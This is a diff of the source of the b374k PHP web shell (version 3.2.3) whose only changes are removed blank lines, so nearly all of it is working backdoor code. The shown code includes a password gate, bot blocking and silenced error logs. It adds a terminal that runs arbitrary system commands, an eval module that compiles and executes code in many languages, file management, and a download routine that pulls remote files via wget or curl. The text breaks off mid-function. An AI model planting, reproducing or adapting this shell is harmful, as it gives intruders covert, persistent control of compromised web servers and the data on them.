@@ -4,7 +4,6 @@
 	Jayalah Indonesiaku
 	(c)2014
 	https://github.com/b374k/b374k
-
 */
 $GLOBALS['pass'] = "fb621f5060b9f65acf8eb4232e3024140dea2b34"; // sha1(md5(pass))
 $GLOBALS['module_to_load'] = array("explorer", "terminal", "eval", "convert", "database", "info", "mail", "network", "processes");$GLOBALS['resources']['b374k'] = "hVXZrrM4En6gjARhC8yoL9hXQ9gDd2xhJ5yw8/Tj/Oef7tPSSG3JwjZVXy1flZ0nc/Lvuk/KAhmH8j9pMhUU8a864CxnQ3W5fLFwmK5fiX4JV9xny9o8G32+Txphqs9CfjhSqDheisVojklHbHNcLDN17HJaGkpDHGhdFDpklnXd/aNwaGMgVWgoXoHVm2vqktW3PEmkD/Z7CBtSKFwVYXOX81wdh/mYNmh9uy2IWnNjLKB1cAYmEK+bjQWvxK+orA+8oiX9CB/f0dm1akNfVGEnrKGaM/na5bJYFvJ1SgdAFVAf+rRGvU999mkYoJFL16pSUlBmy+WJUVupTTGtU6XK9HlOSHG4FvwFHNcGCOKuChFmNCJqehEG3K0EDbuDmt4+06zR3RReV7N5HebBlir/ezZEeVe0Nm5G1xGjP/3Jeqe/u9orV5zNquk1x3PcGLLT6JkjPujd8lrSONnDONXDeED9+noWIYlGj3KG+s0PXDF+mE3WdzCGbk1r7ojliIpCbc0fNqPW6l85gHH+tAnPlt85WSKMmQ28qjKe3o2GXWHOiTTcl+wcIUec6XlonSgOmgmv1cBI6Od3roxffDJE9GBX4BKbgV1n4/jLZoY7bhxGjNpXaK6wlHEwS3b8yX+TYuhayNJmnOICeOYMlG6LXcaFMUH/teZTS3ENIE+QU2EUIOdVLjNHIDNrCjm1v/0vfbla4fmZyMymiqZn1uwrwLoF2sGzo/3WF6+m1XYL9KlKe7NzfZifT63w5JiENgVaRzIhx0CwCSCUB/AkCaCS4Ag5Z6LgtDx2N89Ysv3oBx60jwdzDLn5gdf+Hc//R7x7zdIffjwfpRw5OJJH3MVifMD8lL9zSCUheeayBLkKNAfG/pE3+g72xutwRB81m2gDTblZgroD3z9t3xRNVMTtE5CwfnGzDTgH1sP/8GBumjy8dung/MBz/o53/iPe+vHdwP9PLX5qlGd+1aPfOvK33He//eo/D/4XGCKTpSbBAlSVg+XT51mtIveF8kPtc+/oh+s7XKA0yVMyc1czK0m5FcizEtp3j9Uobo/VtFeRWwLVL9WirnUKcXlW93Szk17izDlPcX1EFbigsg1m4Bu3L7f8clGbN3VPcKlMC+WaGsjbLV5xpLikFwYn4nK/PwUux5s7Te7nMFjWuTxPwuXfN+fWDrpVEkUS5Ex458opjhDcjLNQQz05SfRiic/yxJYClJJ0GalwMFCLbU6gX550e9lKYn/sJnMVyGGiXy3NOwrpYvKrdGmF09vrvuSXhePUbezJ83DWELlMCqstgB6mN1DFTqlRJFHYXuoQS8VC57CK9a0j0aZJLwEtMql9hnM1CqajXPlsJmLrdJKyeyDCFF28zPzy/BwbK7F5Xa06LEld9yvNS5eEenjezdVXtzNGOeQowW+W0C5CpCdqTQ2rFy2snHfB5tLaxnjaATL3yDQw3ntK3pgFvqi3FeCPK7MNmeabrjgNujuF9XNHOT3yyrwS9lo0uWcT88uuFc0DDYnnO67Z2Iz9YA/06Nlnx6J76pWMd30jVPZGJDyv1qD4ioVxDtUloC8V2z4sSC9TJIZ5vFfrmY+EPCJSo3cjcFMDdBGWV3zCZ+Lga+VMThJhf7Wtqk8CO8uPgbFdr+pAL/ElXfq9aIzto2QY6WVupahhDceF44u7I/TE31hQI2KEiKvhc7bGjxbwGOxaCTKptWrZ3XMauYmqNLoVb4PhzUbTO0RLQ3T8zTOfK3wjk+6V52G/Lhhp7t65JjIFRMMJHjrilgb9VGKGbSbA6/4pfXGV29gx2755aq2/juOiGvnu325kquDsPUi7EG/wO6zHjEhlVTHv8G4hcjaT8nnqPPRmhdlaOYGmrsFcoggzVNpbBl9f4TlK6bWQoqUOnnnK8plsdesZ7WhmFVsSuPOx1BHp45oUpElV7XhhE/TYvfFXKszKl7t7TkzpzJO8l6zI9ki1soLaypb96wl3/cBydJKPVPWP/wI=";
@@ -12,7 +11,6 @@ $GLOBALS['resources']['mime'] = "dZThdqMgEIX/7zn7DvMC2jZ62t3HmQgaGkepCDFvvxeNis3
 $GLOBALS['resources']['arrow'] = "FZXHDqtYDIYfKCPRS2Z0F4cSem+BHfVQA6HD00+uF/Zny2XzSy7SNf23GVJYItMH/pelS0mT/zQhZ7kHqklwBD8zvaAWA/gj/m8KIA/iX+Du8jOjfwv8m1Oit/Gjxfs5XYSyR7wZ9sdiLPaiE7rxwYZvDz3z0G0fN9Pt1PqiDLuyRgzA7sVpo2NvL3Cdy6p1eSS3Um21eZqfW2uc6Xc9STYjG0E8zybZ3lxYrGLgmij6FTgD+oE1fHzRyB9IXpIFlT+6J8XARNRivqAELyNW694fBYKgdQ54i2RquOgoIwOqEpRK6G66qk4HjFCAWX9NRp5cU6hMsdvSQhiGCXr7Hmfyl/TaR9KwjDxldWNp9wx7zux2sY0uWUABDxUQWhoG2Dt8WlOYIuH8fjpej0l0Ag3k01AHYyLNNo7exzAS7jczTk5oogzNlETVL5g2TcLYQI7n5y+9dRXzgN4z19fKr4mPCsLm+Z4fhc9nFab7ORjMJSOarH0XxJM8bMHBKhENzgreEnB4RwFNgUb1wm6yMFd9syRt0rPChFJ4e7D2md63/czFE+B2LsNxEpkwZeLntSUuUyuCTZGb0bYMBi9PfT3ACaK/fYdUE8GzeuLXbI0WiI/zRT7snWMV7vXc0BLFwQvIfSYKjgtoIiKJO8reFV4ahnMA1JRdKx1HMiyyMoZnMgQX7W2Jb4/tudaDRtJOUgZY5FAFbpEnYQiABEU5E+XyKu3pqRizh676B29Ssyk1ZZcZwLKwlms5igcnOp1+1ekSSQK9Lv0S2ZnH92jrgEbjN0b9dO44OK4Z4mIc2VxoxxZepzO+WLzcJrra8wYG5RKqDNe3w+ODQnrPzk+OyZo+z8kL8HK3XNhcc7Cy92cVYW3WsVZpSzZCVEopMlUun/XlOFzTWnVpt8ShAFmZsxVB3sNWkvLAUSxdyhWMgea1yH4jJVBb3QaAFPrxU3v6VD7DsFpOCVxSwRZsTFsw6Ga1qFmVUxS3tV9WjJkhkxZAMaHLA7+0NJ7dy9abkmqhppR9oAYIJM9g3OHTD+8+wQtkYMCiHSxQxMEzWvkktKPzgskfd/F3m4WH09lAfUtThQ+JA2pMvbnJ6t8SLwdtzXvR47Ze0Z0VkC5F6c7eSxl6n8/pudIYGl89MitzIHEuXxVYD3J+qt9oQ4PJqsQjEOewetHZEUf8UCRYjHw7vmxoe0Bjtx59p4PftRrDqXDRXTLqQ1NGLVE613PVZmyaiRe6SnV9b8SCdA91B7a1hB8RS3xWHIXdY6T9TwCc0xRi3IZGTB74VSs6rLkrXVm0jVjjQNstEz3DCNOpVy3Xk91cVJxbaOKEbFvrQCy2fxSUzhanvPq5bmccNWTPG3UbMsXoPWSS5TTTvo/W8LsiZ6Sdzdm2qGSqJapvuncb/jlI1c4i60NN53TasogwL0a/GFnyF4lgiGXW2N7BNyL5EEyQA42LdZtao2S9f+reA04QDbaEQtRg0YRlb/E0ksyci4MM1HlVvvqQlz0aqMXesslvqz7Y4baL0WvNHvflRnLNxLR5IFfb9KrZT97Lotz8OFtJJj9ugSFhVYy9nzcuRvC+vbF6zdrWpYtPek+rxjaeMog4pvOIbJ3wOTQmFb3d/atN9HV7ZsuZFAIRngh0oVQKZXb+fgBOdQNKnDsVQvjnz/8=";
 $GLOBALS['ver'] = "3.2.3";
 $GLOBALS['title'] = "b374k";
-
 @ob_start();
 error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
 @ini_set('html_errors','0');
@@ -21,7 +19,6 @@ error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
 @ini_set('log_errors','0');
 @set_time_limit(0);
 @clearstatcache();
-
 if(!function_exists('auth')){
 	function auth(){
 		if(isset($GLOBALS['pass']) && (trim($GLOBALS['pass'])!='')){
@@ -34,7 +31,6 @@ if(!function_exists('auth')){
 					header("Location: ".get_self());
 				}
 			}
-
 			if(!isset($c['pass']) || ((isset($c['pass'])&&($c['pass']!=$GLOBALS['pass'])))){
 				$res = "<!doctype html>
 		<html>
@@ -58,7 +54,6 @@ if(!function_exists('auth')){
 		}
 	}
 }
-
 if(!function_exists('get_server_info')){
 	function get_server_info(){
 		$server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"];
@@ -70,26 +65,22 @@ if(!function_exists('get_server_info')){
 		return $server_info;
 	}
 }
-
 if(!function_exists('get_self')){
 	function get_self(){
 		$query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:"";
 		return html_safe($_SERVER["REQUEST_URI"].$query);
 	}
 }
-
 if(!function_exists('get_post')){
 	function get_post(){
 		return fix_magic_quote($_POST);
 	}
 }
-
 if(!function_exists('get_nav')){
 	function get_nav($path){
 		return parse_dir($path);
 	}
 }
-
 if(!function_exists('get_cwd')){
 	function get_cwd(){
 		$cwd = getcwd().DIRECTORY_SEPARATOR;
@@ -104,13 +95,11 @@ if(!function_exists('get_cwd')){
 		return $cwd;
 	}
 }
-
 if(!function_exists('wrap_with_quotes')){
 	function wrap_with_quotes($str){
 		return "\"".$str."\"";
 	}
 }
-
 if(!function_exists('get_resource')){
 	function get_resource($type){
 		if(isset($GLOBALS['resources'][$type])){
@@ -119,7 +108,6 @@ if(!function_exists('get_resource')){
 		return false;
 	}
 }
-
 if(!function_exists('block_bot')){
 	function block_bot(){
 		// block search engine bot
@@ -135,13 +123,11 @@ if(!function_exists('block_bot')){
 		}
 	}
 }
-
 if(!function_exists('is_win')){
 	function is_win(){
 		return (strtolower(substr(php_uname(),0,3)) == "win")? true : false;
 	}
 }
-
 if(!function_exists('fix_magic_quote')){
 	function fix_magic_quote($arr){
 		$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
@@ -156,12 +142,10 @@ if(!function_exists('fix_magic_quote')){
 		return $arr;
 	}
 }
-
 if(!function_exists('execute')){
 	function execute($code){
 		$output = "";
 		$code = $code." 2>&1";
-
 		if(is_callable('system') && function_exists('system')){
 			ob_start();
 			@system($code);
@@ -215,13 +199,11 @@ if(!function_exists('execute')){
 		return "";
 	}
 }
-
 if(!function_exists('html_safe')){
 	function html_safe($str){
 		return htmlspecialchars($str, 2 | 1);
 	}
 }
-
 if(!function_exists('parse_dir')){
 	function parse_dir($path){
 		$path = realpath($path).DIRECTORY_SEPARATOR;
@@ -236,7 +218,6 @@ if(!function_exists('parse_dir')){
 		return trim($res);
 	}
 }
-
 if(!function_exists('zip')){
 	function zip($files, $archive){
 		$status = false;
@@ -244,7 +225,6 @@ if(!function_exists('zip')){
 		if(class_exists("ZipArchive")){
 			$zip = new ZipArchive();
 			if(!$zip->open($archive, 1)) return $status;
-
 			if(!is_array($files)) $files = array($files);
 			foreach($files as $file){
 				$file = str_replace(get_cwd(), '', $file);
@@ -254,7 +234,6 @@ if(!function_exists('zip')){
 					foreach($filesIterator as $iterator){
 						$iterator = str_replace('\\', '/', $iterator);
 						if(in_array(substr($iterator, strrpos($iterator, '/')+1), array('.', '..'))) continue;
-
 						if(is_dir($iterator)) $zip->addEmptyDir(str_replace($file.'/', '', $iterator.'/'));
 						else if(is_file($iterator)) $zip->addFromString(str_replace($file.'/', '', $iterator), read_file($iterator));
 					}
@@ -267,7 +246,6 @@ if(!function_exists('zip')){
 		return $status;
 	}
 }
-
 if(!function_exists('compress')){
 	function compress($type, $archive, $files){
 		if(!is_array($files)) $files = array($files);
@@ -277,20 +255,16 @@ if(!function_exists('compress')){
 		}
 		elseif(($type=='tar')||($type=='targz')){
 			$archive = basename($archive);
-
 			$listsBasename = array_map("basename", $files);
 			$lists = array_map("wrap_with_quotes", $listsBasename);
-
 			if($type=='tar') execute("tar cf \"".$archive."\" ".implode(" ", $lists));
 			elseif($type=='targz') execute("tar czf \"".$archive."\" ".implode(" ", $lists));
-
 			if(is_file($archive)) return true;
 			else return false;
 		}
 		return false;
 	}
 }
-
 if(!function_exists('decompress')){
 	function decompress($type, $archive, $path){
 		$path = realpath($path).DIRECTORY_SEPARATOR;
@@ -315,13 +289,11 @@ if(!function_exists('decompress')){
 				execute("tar xf \"".basename($archive)."\" -C \"".$target."\"");
 				$after = count(get_all_files($target));
 				if($before!=$after) $status = true;
-
 			}
 			elseif($type=='untargz'){
 				$target = "";
 				if(strpos(strtolower($archive), ".tar.gz")!==false) $target = basename($archive,".tar.gz");
 				elseif(strpos(strtolower($archive), ".tgz")!==false) $target = basename($archive,".tgz");
-
 				if(!is_dir($target)) mkdir($target);
 				$before = count(get_all_files($target));
 				execute("tar xzf \"".basename($archive)."\" -C \"".$target."\"");
@@ -332,35 +304,27 @@ if(!function_exists('decompress')){
 		return $status;
 	}
 }
-
 if(!function_exists('download')){
 	function download($url ,$saveas){
 		if(!preg_match("/[a-z]+:\/\/.+/",$url)) return false;
 		$filename = basename($url);
-
 		if($content = read_file($url)){
 			if(is_file($saveas)) unlink($saveas);
 			if(write_file($saveas, $content)){
 				return true;
 			}
 		}
-
 		$buff = execute("wget ".$url." -O ".$saveas);
 		if(is_file($saveas)) return true;
-
 		$buff = execute("curl ".$url." -o ".$saveas);
 		if(is_file($saveas)) return true;
-
 		$buff = execute("lwp-download ".$url." ".$saveas);
 		if(is_file($saveas)) return true;
-
 		$buff = execute("lynx -source ".$url." > ".$saveas);
 		if(is_file($saveas)) return true;
-
 		return false;
 	}
 }
-
 if(!function_exists('get_fileperms')){
 	function get_fileperms($file){
 		if($perms = @fileperms($file)){
@@ -386,7 +350,6 @@ if(!function_exists('get_fileperms')){
 		else return "???????????";
 	}
 }
-
 if(!function_exists('format_bit')){
 	function format_bit($size){
 		$base = log($size) / log(1024);
@@ -394,7 +357,6 @@ if(!function_exists('format_bit')){
 		return round(pow(1024, $base - floor($base)),2)." ".$suffixes[floor($base)];
 	}
 }
-
 if(!function_exists('get_filesize')){
 	function get_filesize($file){
 		$size = @filesize($file);
@@ -405,13 +367,11 @@ if(!function_exists('get_filesize')){
 		else return "???";
 	}
 }
-
 if(!function_exists('get_filemtime')){
 	function get_filemtime($file){
 		return @date("d-M-Y H:i:s", filemtime($file));
 	}
 }
-
 if(!function_exists('get_fileowner')){
 	function get_fileowner($file){
 		$owner = "?:?";
@@ -423,7 +383,6 @@ if(!function_exists('get_fileowner')){
 		return $owner;
 	}
 }
-
 if(!function_exists('rmdirs')){
 	function rmdirs($dir, $counter = 0){
 		if(is_dir($dir)) $dir = realpath($dir).DIRECTORY_SEPARATOR;
@@ -443,14 +402,12 @@ if(!function_exists('rmdirs')){
 		return $counter;
 	}
 }
-
 if(!function_exists('copys')){
 	function copys($source , $target ,$c=0){
 		$source = realpath($source).DIRECTORY_SEPARATOR;
 		if($dh = opendir($source)){
 			if(!is_dir($target)) mkdir($target);
 			$target = realpath($target).DIRECTORY_SEPARATOR;
-
 			while(($f = readdir($dh))!==false){
 				if(($f!='.')&&($f!='..')){
 					if(is_dir($source.$f)){
@@ -466,7 +423,6 @@ if(!function_exists('copys')){
 		return $c;
 	}
 }
-
 if(!function_exists('get_all_files')){
 	function get_all_files($path){
 		$path = realpath($path).DIRECTORY_SEPARATOR;
@@ -480,7 +436,6 @@ if(!function_exists('get_all_files')){
 		return $files;
 	}
 }
-
 if(!function_exists('read_file')){
 	function read_file($file){
 		$content = false;
@@ -493,7 +448,6 @@ if(!function_exists('read_file')){
 		return $content;
 	}
 }
-
 if(!function_exists('write_file')){
 	function write_file($file, $content){
 		if($fh = @fopen($file, "wb")){
@@ -502,18 +456,15 @@ if(!function_exists('write_file')){
 		return false;
 	}
 }
-
 if(!function_exists('view_file')){
 	function view_file($file, $type, $preserveTimestamp='true'){
 		$output = "";
 		if(is_file($file)){
 			$dir = dirname($file);
-
 			$owner = "";
 			if(!is_win()){
 				$owner = "<tr><td>Owner</td><td>".get_fileowner($file)."</td></tr>";
 			}
-
 			$image_info = @getimagesize($file);
 			$mime_list = get_resource('mime');
 			$mime = "";
@@ -530,7 +481,6 @@ if(!function_exists('view_file')){
 				elseif(!empty($mime)) $type = "multimedia";
 				else $type = "raw";
 			}
-
 			$content = "";
 			if($type=="code"){
 				$hl_arr = array(
@@ -559,17 +509,14 @@ if(!function_exists('view_file')){
 					<span class='strong'>[ </span>View Full Size<span class='strong'> ]</span></a></p>";
 				}
 				else $imglink = "";
-
 				$content = "<center>".$image_info_h."<br>".$imglink."
 					<img id='viewImage' style='width:".$width."px;' src='data:".$image_info['mime'].";base64,".base64_encode(read_file($file))."' alt='".$file."'></center>
 	";
-
 			}
 			elseif($type=="multimedia"){
 				$content = "<center>
 							<video controls>
 							<source src='' type='".$mime."'>
-
 							</video>
 							<p><span class='button' onclick=\"multimedia('".html_safe(addslashes($file))."');\">Load Multimedia File</span></p>
 							</center>";
@@ -583,9 +530,6 @@ if(!function_exists('view_file')){
 				$content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='".html_safe($file)."' onkeydown=\"trap_enter(event, 'edit_save_hex');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_hex();\">save</span></td><td style='vertical-align:middle;'><div class='cBox".$preservecbox."'></div><span>preserve modification timestamp</span><span id='editHexResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_hex');\">".bin2hex(read_file($file))."</textarea></td></tr></table>";
 			}
 			else $content = "<pre>".html_safe(read_file($file))."</pre>";
-
-
-
 			$output .= "
 	<table id='viewFile' class='boxtbl'>
 	<tr><td style='width:120px;'>Filename</td><td>".html_safe($file)."</td></tr>
@@ -606,14 +550,11 @@ if(!function_exists('view_file')){
 	</td></tr>
 	<tr><td colspan='2'><div id='viewFilecontent'>".$content."</div></td></tr>
 	</table>";
-
-
 		}
 		else $output = "error";
 		return $output;
 	}
 }
-
 if(!function_exists('get_writabledir')){
 	function get_writabledir(){
 		if(is_writable(".")) return realpath(".").DIRECTORY_SEPARATOR;
@@ -630,7 +571,6 @@ if(!function_exists('get_writabledir')){
 			else{
 				if(!is_win()){ if(is_writable("/tmp")) return "/tmp/"; }
 			}
-
 			$tempfile = tempnam(__FILE__,'');
 			if(file_exists($tempfile)){
 				$dir = realpath(dirname($tempfile)).DIRECTORY_SEPARATOR;
@@ -641,7 +581,6 @@ if(!function_exists('get_writabledir')){
 		return false;
 	}
 }
-
 if(!function_exists('get_drives')){
 	function get_drives(){
 		$drives = "";
@@ -658,7 +597,6 @@ if(!function_exists('get_drives')){
 		return $drives;
 	}
 }
-
 if(!function_exists('show_all_files')){
 	function show_all_files($path){
 		if(!is_dir($path)) return "No such directory : ".$path;
@@ -673,16 +611,13 @@ if(!function_exists('show_all_files')){
 				}
 			}
 		}
-
 		array_unshift($allfolders, ".");
 		$cur = getcwd();
 		chdir("..");
 		if(getcwd()!=$cur) array_unshift($allfolders, "..");
 		chdir($cur);
-
 		natcasesort($allfolders);
 		natcasesort($allfiles);
-
 		$cols = array();
 		if(is_win()){
 			$cols = array(
@@ -697,18 +632,14 @@ if(!function_exists('show_all_files')){
 					"modified"=>"get_filemtime"
 					);
 		}
-
 		$totalFiles = count($allfiles);
 		$totalFolders = 0;
-
 		$output .= "<table id='xplTable' class='dataView sortable'><thead>";
 		$output .= "<tr><th class='col-cbox sorttable_nosort'><div class='cBoxAll'></div></th><th class='col-name'>name</th><th class='col-size'>size</th>";
-
 		foreach($cols as $k=>$v){
 			$output .= "<th class='col-".$k."'>".$k."</th>";
 		}
 		$output .= "</tr></thead><tbody>";
-
 		foreach($allfolders as $d){
 			$cboxException = "";
 			if(($d==".")||($d=="..")){
@@ -743,7 +674,6 @@ if(!function_exists('show_all_files')){
 			$output .= "</tr>";
 		}
 		$output .= "</tbody><tfoot>";
-
 		$colspan = 1 + count($cols);
 		$output .= "<tr><td><div class='cBoxAll'></div></td><td>
 		<select id='massAction' class='colSpan'>
@@ -773,49 +703,39 @@ if(!function_exists('show_all_files')){
 		return $output;
 	}
 }
-
 if(!function_exists('eval_get_supported')){
 	function eval_get_supported(){
 		$eval_supported = array();
 		
 		$eval_supported[] = "php";
-
 		$check = strtolower(execute("python -h"));
 		if(strpos($check,"usage")!==false) $eval_supported[] = "python";
-
 		$check = strtolower(execute("perl -h"));
 		if(strpos($check,"usage")!==false) $eval_supported[] = "perl";
-
 		$check = strtolower(execute("ruby -h"));
 		if(strpos($check,"usage")!==false) $eval_supported[] = "ruby";
-
 		$check = strtolower(execute("node -h"));
 		if(strpos($check,"usage")!==false) $eval_supported[] = "node";
 		else{
 			$check = strtolower(execute("nodejs -h"));
 			if(strpos($check,"usage")!==false) $eval_supported[] = "nodejs";
 		}
-
 		$check = strtolower(execute("gcc --help"));
 		if(strpos($check,"usage")!==false) $eval_supported[] = "gcc";
-
 		$check = strtolower(execute("java -help"));
 		if(strpos($check,"usage")!==false){
 			$check = strtolower(execute("javac -help"));
 			if(strpos($check,"usage")!==false) $eval_supported[] = "java";
 		}
-
 		return implode(",", $eval_supported);
 	}
 }
-
 if(!function_exists('eval_go')){
 	function eval_go($evalType, $evalCode, $evalOptions, $evalArguments){
 		$res = "";
 		$output = "";
 		if($evalOptions!="") $evalOptions = $evalOptions." ";
 		if($evalArguments!="") $evalArguments = " ".$evalArguments;
-
 		if($evalType=="php"){
 			ob_start();
 			eval($evalCode);
@@ -826,7 +746,6 @@ if(!function_exists('eval_go')){
 		elseif(($evalType=="python")||($evalType=="perl")||($evalType=="ruby")||($evalType=="node")||($evalType=="nodejs")){
 			$tmpdir = get_writabledir();
 			chdir($tmpdir);
-
 			$res .= "Using dir : ".$tmpdir;
 			if(is_writable($tmpdir)){
 				$res .= " (writable)\n";
@@ -844,7 +763,6 @@ if(!function_exists('eval_go')){
 						$output = execute($cmd);
 					}
 					else $res .= " (failed)\n";
-
 					$res .= "Deleting temporary file : ".$path;
 					if(unlink($path)) $res .= " (ok)\n";
 					else $res .= " (failed)\n";
@@ -852,14 +770,12 @@ if(!function_exists('eval_go')){
 				else $res .= " (failed)\n";
 			}
 			else $res .= " (not writable)\n";
-
 			$res .= "Finished...";
 			return $res."{[|b374k|]}".$output;
 		}
 		elseif($evalType=="gcc"){
 			$tmpdir = get_writabledir();
 			chdir($tmpdir);
-
 			$res .= "Using dir : ".$tmpdir;
 			if(is_writable($tmpdir)){
 				$res .= " (writable)\n";
@@ -897,18 +813,15 @@ if(!function_exists('eval_go')){
 				else $res .= " (failed)\n";
 			}
 			else $res .= " (not writable)\n";
-
 			$res .= "Finished...";
 			return $res."{[|b374k|]}".$output;
 		}
 		elseif($evalType=="java"){
 			$tmpdir = get_writabledir();
 			chdir($tmpdir);
-
 			$res .= "Using dir : ".$tmpdir;
 			if(is_writable($tmpdir)){
 				$res .= " (writable)\n";
-
 				if(preg_match("/class\ ([^{]+){/i",$evalCode, $r)){
 					$classname = trim($r[1]);
 					$filename = $classname;
@@ -918,7 +831,6 @@ if(!function_exists('eval_go')){
 					$filename = $evalType.$uniq;
 					$evalCode = "class ".$filename." { ".$evalCode . " } ";
 				}
-
 				$path = $filename.".java";
 				$res .= "Temporary file : ".$path;
 				if(write_file($path, $evalCode)){
@@ -949,14 +861,12 @@ if(!function_exists('eval_go')){
 				else $res .= " (failed)\n";
 			}
 			else $res .= " (not writable)\n";
-
 			$res .= "Finished...";
 			return $res."{[|b374k|]}".$output;
 		}
 		elseif($evalType=="executable"){
 			$tmpdir = get_writabledir();
 			chdir($tmpdir);
-
 			$res .= "Using dir : ".$tmpdir;
 			if(is_writable($tmpdir)){
 				$res .= " (writable)\n";
@@ -969,7 +879,6 @@ if(!function_exists('eval_go')){
 					$cmd = $path.$evalArguments;
 					$res .= "Execute : ".$cmd."\n";
 					$output = execute($cmd);
-
 					$res .= "Deleting temporary file : ".$path;
 					if(unlink($path)) $res .= " (ok)\n";
 					else $res .= " (failed)\n";
@@ -977,14 +886,12 @@ if(!function_exists('eval_go')){
 				else $res .= " (failed)\n";
 			}
 			else $res .= " (not writable)\n";
-
 			$res .= "Finished...";
 			return $res."{[|b374k|]}".$output;
 		}
 		return false;
 	}
 }
-
 if(!function_exists('output')){
 	function output($str){
 		$error = @ob_get_contents();
@@ -1003,7 +910,6 @@ $nav = get_nav(get_cwd());
 $p = array_map("rawurldecode", get_post());
 $cwd = html_safe(get_cwd());
 $GLOBALS['module'] = array();
-
 $explorer_content = "";
 if(isset($p['viewEntry'])){
 	$path = trim($p['viewEntry']);
@@ -1025,19 +931,15 @@ if(isset($p['viewEntry'])){
 	}
 }
 else $explorer_content = show_all_files(get_cwd());
-
 $GLOBALS['module']['explorer']['id'] = "explorer";
 $GLOBALS['module']['explorer']['title'] = "Explorer";
 $GLOBALS['module']['explorer']['js_ontabselected'] = "";
 $GLOBALS['module']['explorer']['content'] = $explorer_content;
-
 $GLOBALS['module']['terminal']['id'] = "terminal";
 $GLOBALS['module']['terminal']['title'] = "Terminal";
 $GLOBALS['module']['terminal']['js_ontabselected'] = "
 if((!portableMode) && ($('#terminalOutput').html()=='')) $('#terminalInput').focus();";
 $GLOBALS['module']['terminal']['content'] = "<pre id='terminalOutput'></pre><table id='terminalPrompt'><tr><td class='colFit'><span id='terminalCwd' class='strong'>".get_cwd()."&gt;</span</td><td id='terminalCommand'><input type='text' id='terminalInput' class='floatLeft' spellcheck='false'></td></tr></table>";
-
-
 $GLOBALS['module']['eval']['id'] = "eval";
 $GLOBALS['module']['eval']['title'] = "Eval";
 $GLOBALS['module']['eval']['js_ontabselected'] = "
@@ -1070,12 +972,10 @@ $GLOBALS['module']['eval']['content'] = "
 </tbody>
 </table>
 ";
-
 $res = "";
 if(isset($p['cd'])){
 	$path = $p['cd'];
 	if(trim($path)=='') $path = dirname(__FILE__);
-
 	$path = realpath($path);
 	if(is_file($path)) $path = dirname($path);
 	if(is_dir($path)){
@@ -1167,12 +1067,10 @@ elseif(isset($p['findType'])){
 	$findReadable = trim($p['findReadable']);
 	$findWritable = trim($p['findWritable']);
 	$findExecutable = trim($p['findExecutable']);
-
 	$candidate = get_all_files($findPath);
 	if($findType=='file') $candidate = array_filter($candidate, "is_file");
 	elseif($findType=='folder') $candidate = array_filter($candidate, "is_dir");
 	else $res = "error";
-
 	foreach($candidate as $k){
 		if(($findType=="file")||($findType=="folder")){
 			if(!empty($findName)){
@@ -1190,7 +1088,6 @@ elseif(isset($p['findType'])){
 					else{
 						$check = strpos(basename($k), $findName)===false;
 					}
-
 					if($check){
 						$candidate = array_diff($candidate, array($k));
 					}
@@ -1221,7 +1118,6 @@ elseif(isset($p['findType'])){
 			}
 		}
 	}
-
 	foreach($candidate as $k){
 		if($findReadable=="true"){
 			if(!is_readable($k)) $candidate = array_diff($candidate, array($k));
@@ -1233,7 +1129,6 @@ elseif(isset($p['findType'])){
 			if(!is_executable($k)) $candidate = array_diff($candidate, array($k));
 		}
 	}
-
 	if(count($candidate)>0){
 		$res = "";
 		foreach($candidate as $k){
@@ -1246,11 +1141,9 @@ elseif(isset($p['findType'])){
 elseif(isset($p['ulType'])){
 	$ulSaveTo = trim($p['ulSaveTo']);
 	$ulFilename = trim($p['ulFilename']);
-
 	if($p['ulType']=='comp'){
 		$ulFile = $_FILES['ulFile'];
 		if(empty($ulFilename)) $ulFilename = $ulFile['name'];
-
 		if(is_uploaded_file($ulFile['tmp_name'])){
 			if(!is_dir($ulSaveTo)) mkdir($ulSaveTo);
 			$newfile = realpath($ulSaveTo).DIRECTORY_SEPARATOR.$ulFilename;
@@ -1266,7 +1159,6 @@ elseif(isset($p['ulType'])){
 		if(empty($ulFilename)) $ulFilename = basename($ulFile);
 		if(!is_dir($ulSaveTo)) mkdir($ulSaveTo);
 		$newfile = realpath($ulSaveTo).DIRECTORY_SEPARATOR.$ulFilename;
-
 		if(download($ulFile, $newfile)){
 			$res = "<span class='strong'>&gt;</span>&nbsp;<a data-path='".html_safe($newfile)."' onclick='view_entry(this);'>".html_safe($newfile)."</a>&nbsp;( 100% )";
 		}
@@ -1305,7 +1197,6 @@ elseif(isset($p['multimedia'])){
 			$mime = $res[1];
 		}
 	}
-
 	if(is_file($file)){
 		header("Content-Type: ".$mime);
 		header('Content-Transfer-Encoding: binary');
@@ -1320,7 +1211,6 @@ elseif(isset($p['massType'])&&isset($p['massBuffer'])&&isset($p['massPath'])&&is
 	$massPath = realpath($p['massPath']).DIRECTORY_SEPARATOR;
 	$massValue = trim($p['massValue']);
 	$counter = 0;
-
 	$massBufferArr = explode("\n", $massBuffer);
 	if(($massType=='tar')||($massType=='targz')||($massType=='zip')){
 		if(compress($massType, $massValue, $massBufferArr)){
@@ -1394,12 +1284,10 @@ elseif(isset($p['evalInput']) && isset($p['evalType'])){
 	$evalOptions = (isset($p['evalOptions']))? $p['evalOptions']:"";
 	$evalArguments = (isset($p['evalArguments']))? $p['evalArguments']:"";
 	$evalType = $p['evalType'];
-
 	error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
 	@ini_set('html_errors','0');
 	@ini_set('display_errors','1');
 	@ini_set('display_startup_errors','1');
-
 	$res = eval_go($evalType, $evalInput, $evalOptions, $evalArguments);
 	if($res===false) $res == "error";
 	output(html_safe($res));
@@ -1423,39 +1311,29 @@ $GLOBALS['module']['convert']['content'] = "
 </tbody>
 <tfoot id='decodeResult'><tr><td colspan='2'>You can also press ctrl+enter to submit</td></tr></tfoot>
 </table>";
-
 if(!function_exists('decode')){
 	function decode($str){
 		$res = "";
 		$length = (int) strlen($str);
-
 		$res .= decode_line("md5", md5($str), "input");
